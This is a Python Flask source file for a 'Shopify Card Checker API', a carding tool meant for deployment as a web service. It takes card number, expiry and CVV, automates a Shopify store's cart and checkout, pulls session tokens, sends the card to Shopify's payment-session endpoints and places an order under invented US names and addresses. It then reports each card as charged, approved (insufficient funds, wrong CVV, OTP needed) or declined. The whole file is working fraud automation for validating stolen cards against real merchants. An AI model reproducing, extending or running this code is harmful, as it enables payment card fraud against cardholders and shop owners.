#!/usr/bin/env python3
# SHOPIFY CARD CHECKER API - ADVANCED TOKENIZATION
# DEPLOY ON RAILWAY

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import httpx
import random
import re
import json
import os
from urllib.parse import urlparse
from fake_useragent import UserAgent
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================================
# ADVANCED SHOPIFY CHECKER - TOKENIZATION FLOW
# ============================================================

class ShopifyAdvancedChecker:
    def __init__(self):
        self.user_agent = UserAgent().random
        self.session = None
        self.last_price = None
    
    def find_between(self, s, start, end):
        try:
            if start in s and end in s:
                return (s.split(start))[1].split(end)[0]
            return ""
        except:
            return ""
    
    async def get_random_info(self):
        """Generate realistic US address and identity"""
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
            {"add1": "777 Broadway", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10001"},
            {"add1": "888 Sunset Blvd", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa", "James", "Emma"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        phone = random.choice(["2025550199", "3105551234", "4155559876", "6175550123", "9718081573", "2125559999", "7735551212"])
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }
    
    def format_response(self, status, message, order_id=None, details=None):
        """Format response for API output"""
        if status == "CHARGED":
            formatted = f"✅ CARD CHARGED! 💰 Order ID: {order_id}" if order_id else "✅ CARD CHARGED!"
            return {
                "status": "CHARGED",
                "formatted_response": formatted,
                "response": "ORDER_PLACED",
                "order_id": order_id,
                "details": details or {}
            }
        elif status == "APPROVED":
            if "insufficient" in message.lower() or "balance" in message.lower():
                return {"status": "APPROVED", "formatted_response": "⚠️ APPROVED - Insufficient Funds", "response": "INSUFFICIENT_FUNDS", "details": details or {}}
            elif "cvv" in message.lower() or "cvc" in message.lower():
                return {"status": "APPROVED", "formatted_response": "⚠️ APPROVED - Incorrect CVV", "response": "INCORRECT_CVC", "details": details or {}}
            elif "otp" in message.lower() or "3d" in message.lower():
                return {"status": "APPROVED", "formatted_response": "⚠️ APPROVED - 3DS/OTP Required", "response": "OTP_REQUIRED", "details": details or {}}
            else:
                return {"status": "APPROVED", "formatted_response": f"⚠️ APPROVED - {message[:50]}", "response": message[:50], "details": details or {}}
        elif status == "DECLINED":
            return {"status": "DECLINED", "formatted_response": "❌ CARD DECLINED", "response": "CARD_DECLINED", "details": details or {}}
        elif status == "ERROR":
            return {"status": "ERROR", "formatted_response": f"⚠️ {message}", "response": "ERROR", "details": details or {}}
        else:
            return {"status": "UNKNOWN", "formatted_response": "❓ Unknown Status", "response": "UNKNOWN", "details": details or {}}

    async def check_card(self, site_url, card):
        """Main card checking flow with tokenization"""
        async with httpx.AsyncClient(follow_redirects=True, timeout=45.0) as session:
            try:
                parts = card.split('|')
                if len(parts) != 4:
                    return self.format_response("ERROR", "Invalid format. Use: CC|MM|YY|CVV")
                
                cc, mon, year, cvv = parts
                
                # ============================================
                # STEP 1: Get Product Info
                # ============================================
                product_header = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                    'user-agent': self.user_agent,
                }
                
                product_response = await session.get(site_url + '/products.json', headers=product_header)
                if product_response.status_code != 200:
                    return self.format_response("ERROR", "Product fetch failed", details={"status_code": product_response.status_code})
                
                products_data = product_response.json()
                if not products_data.get('products'):
                    return self.format_response("ERROR", "No products found")
                
                product = products_data['products'][0]
                product_id = product['id']
                product_handle = product['handle']
                variant_id = product['variants'][0]['id']
                price = product['variants'][0]['price']
                
                # ============================================
                # STEP 2: Add to Cart
                # ============================================
                await session.get(site_url + '/cart.js', headers=product_header)
                
                add_data = {
                    'id': str(variant_id),
                    'quantity': '1',
                    'form_type': 'product',
                }
                
                add_response = await session.post(site_url + '/cart/add.js', headers=product_header, data=add_data)
                if add_response.status_code != 200:
                    return self.format_response("ERROR", "Cart add failed", details={"status_code": add_response.status_code})
                
                # ============================================
                # STEP 3: Get Cart Token
                # ============================================
                cart_response = await session.get(f"{site_url}/cart.js", headers=product_header)
                cart_data = cart_response.json()
                token = cart_data.get('token')
                if not token:
                    return self.format_response("ERROR", "Failed to get cart token")
                
                # ============================================
                # STEP 4: Initiate Checkout
                # ============================================
                checkout_headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site_url,
                    'referer': f"{site_url}/cart",
                    'user-agent': self.user_agent,
                }
                
                await session.get(f"{site_url}/checkout", headers=checkout_headers)
                checkout_response = await session.post(f"{site_url}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'})
                response_text = checkout_response.text
                
                # ============================================
                # STEP 5: Extract Tokens
                # ============================================
                session_token_match = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                    response_text
                )
                if not session_token_match:
                    return self.format_response("ERROR", "Session token extraction failed", details={"response_sample": response_text[:200]})
                
                session_token = session_token_match.group(1)
                queue_token = self.find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = self.find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
                paymentMethodIdentifier = self.find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                
                # ============================================
                # STEP 6: Get Random User Info
                # ============================================
                info = await self.get_random_info()
                fname, lname, email, phone = info["fname"], info["lname"], info["email"], info["phone"]
                add1, city, state_short, zip_code = info["add1"], info["city"], info["state_short"], info["zip"]
                
                # ============================================
                # STEP 7: Create Payment Session (Tokenization)
                # ============================================
                session_endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.pci.shopifyinc.com/sessions",
                    "https://checkout.shopifycs.com/sessions"
                ]
                
                session_created = False
                sessionid = None
                
                for endpoint in session_endpoints:
                    try:
                        payment_headers = {
                            'accept': 'application/json',
                            'content-type': 'application/json',
                            'origin': 'https://checkout.shopifycs.com',
                            'user-agent': self.user_agent,
                        }
                        
                        payment_payload = {
                            'credit_card': {
                                'number': cc,
                                'month': mon,
                                'year': year,
                                'verification_value': cvv,
                                'name': f"{fname} {lname}",
                            },
                            'payment_session_scope': urlparse(site_url).netloc,
                        }
                        
                        payment_response = await session.post(endpoint, headers=payment_headers, json=payment_payload)
                        if payment_response.status_code == 200:
                            session_data = payment_response.json()
                            if "id" in session_data:
                                sessionid = session_data["id"]
                                session_created = True
                                break
                    except:
                        continue
                
                if not session_created:
                    return self.format_response("ERROR", "Payment session creation failed", details={"endpoints_tried": len(session_endpoints)})
                
                # ============================================
                # STEP 8: Submit GraphQL Payment
                # ============================================
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
                
                graphql_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': site_url,
                    'user-agent': self.user_agent,
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-source-id': token,
                }
                
                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'checkpointData': None,
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': add1,
                                            'address2': '',
                                            'city': city,
                                            'countryCode': 'US',
                                            'postalCode': zip_code,
                                            'company': '',
                                            'firstName': fname,
                                            'lastName': lname,
                                            'zoneCode': state_short,
                                            'phone': phone,
                                        },
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True,
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                }],
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentMethodIdentifier,
                                            'sessionId': sessionid,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': add1,
                                                    'address2': '',
                                                    'city': city,
                                                    'countryCode': 'US',
                                                    'postalCode': zip_code,
                                                    'company': '',
                                                    'firstName': fname,
                                                    'lastName': lname,
                                                    'zoneCode': state_short,
                                                    'phone': phone,
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {'any': True},
                                    'dueAt': None,
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': add1,
                                        'address2': '',
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': zip_code,
                                        'company': '',
                                        'firstName': fname,
                                        'lastName': lname,
                                        'zoneCode': state_short,
                                        'phone': phone,
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                                'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
                                'marketingConsent': [{'email': {'value': email}}],
                                'shopPayOptInPhone': {'countryCode': 'US'},
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None,
                                'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': f'{site_url}/checkouts/cn/{token}',
                            'pageId': random_page_id,
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }
                
                graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                if graphql_response.status_code != 200:
                    return self.format_response("ERROR", "GraphQL submission failed", details={"status_code": graphql_response.status_code})
                
                result_data = graphql_response.json()
                completion = result_data.get('data', {}).get('submitForCompletion', {})
                
                # ============================================
                # STEP 9: Parse Result & Poll if Needed
                # ============================================
                if completion.get('__typename') == 'SubmitSuccess':
                    receipt = completion.get('receipt', {})
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return self.format_response("CHARGED", "ORDER_PLACED", receipt.get('token'), {"receipt_id": receipt.get('id')})
                    elif receipt.get('__typename') == 'ActionRequiredReceipt':
                        return self.format_response("APPROVED", "OTP_REQUIRED", details={"receipt_id": receipt.get('id')})
                    elif receipt.get('__typename') == 'FailedReceipt':
                        error = receipt.get('processingError', {})
                        return self.format_response("DECLINED", error.get('code', 'CARD_DECLINED'), details={"error_code": error.get('code')})
                
                elif completion.get('__typename') == 'SubmitRejected':
                    errors = completion.get('errors', [])
                    error_codes = [e.get('code', '') for e in errors if 'code' in e]
                    for code in error_codes:
                        if 'INSUFFICIENT_FUNDS' in code:
                            return self.format_response("APPROVED", "INSUFFICIENT_FUNDS", details={"error_codes": error_codes})
                        elif 'INCORRECT_CVC' in code or 'INCORRECT_CVV' in code:
                            return self.format_response("APPROVED", "INCORRECT_CVC", details={"error_codes": error_codes})
                        elif 'OTP' in code or '3D_SECURE' in code:
                            return self.format_response("APPROVED", "OTP_REQUIRED", details={"error_codes": error_codes})
                    return self.format_response("DECLINED", "CARD_DECLINED", details={"error_codes": error_codes})
                
                elif completion.get('__typename') == 'Throttled':
                    return self.format_response("APPROVED", "Processing - Check back", details={"poll_after": completion.get('pollAfter')})
                
                else:
                    return self.format_response("DECLINED", "CARD_DECLINED", details={"typename": completion.get('__typename')})
                
            except Exception as e:
                return self.format_response("ERROR", str(e)[:150], details={"exception": str(e)})

# ============================================================
# FLASK API
# ============================================================

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "name": "Advanced Shopify Card Checker API",
        "version": "2.0",
        "status": "online",
        "endpoints": {
            "/check": "POST - Check card on Shopify site",
            "/health": "GET - Health check"
        },
        "author": "linuxx"
    })

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route("/check", methods=["POST"])
def check_shopify():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Missing JSON"}), 400
        
        site_url = data.get("site") or data.get("shop_url")
        if not site_url:
            return jsonify({"error": "Missing 'site' parameter"}), 400
        
        card = data.get("cc") or data.get("card")
        if not card:
            return jsonify({"error": "Missing 'cc' parameter"}), 400
        
        if not re.match(r"^\d+\|\d+\|\d+\|\d+$", card):
            return jsonify({"error": "Invalid format. Use: CC|MM|YY|CVV"}), 400
        
        # Rotate user agent per request
        checker = ShopifyAdvancedChecker()
        result = asyncio.run(checker.check_card(site_url, card))
        
        return jsonify({
            "site": site_url,
            "cc": card,
            "result": result,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print("🔥 Advanced Shopify API running on port", port)
    print("📡 Endpoint: /check")
    app.run(host="0.0.0.0", port=port, debug=False)
